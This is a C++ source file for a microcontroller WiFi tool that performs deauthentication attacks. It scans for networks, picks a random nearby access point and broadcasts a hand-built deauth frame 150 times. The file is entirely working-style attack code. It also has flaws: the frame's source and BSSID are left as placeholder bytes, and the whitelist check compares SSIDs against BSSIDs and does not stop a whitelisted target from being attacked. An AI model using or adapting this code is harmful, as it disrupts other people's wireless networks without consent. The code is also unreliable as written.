//////////////////////////////////////////////////
// deauth.cpp: handles the deauth of a local ap //
//////////////////////////////////////////////////

#include "deauth.h"

// deauth packet defined here
uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };

void DeauthAttack::addWhitelist(const char* bssid) {
    whitelist.push_back(bssid);
}

void DeauthAttack::selectAP() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        // check for ap in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
            Serial.println("Selected AP is in the whitelist. Skipping deauthentication.");
            return;
        }

        Serial.print("Selected random AP: ");
        Serial.println(randomAP);
    } else {
        Serial.println("No access points found.");
    }
}

void DeauthAttack::startDeauth() {
    if (randomAP.length() > 0) {
        Serial.println("Starting deauthentication attack on the selected AP...");
        // define the attack
        if (!running) {
            start();
        } else {
            Serial.println("Attack is already running.");
        }
    } else {
        Serial.println("No access point selected. Use selectRandomAP() first.");
    }
}

void DeauthAttack::start() {
    running = true;
    int packetSize = sizeof(deauthPacket);

    // send the deauth 150 times
    for (int i = 0; i < 150; ++i) {
        wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthPacket), packetSize, 0);
        Serial.println("(>-<) Deauth packet sent!");
        delay(100);
    }
    Serial.println("(^-^) Attack finished!");
    running = false;
}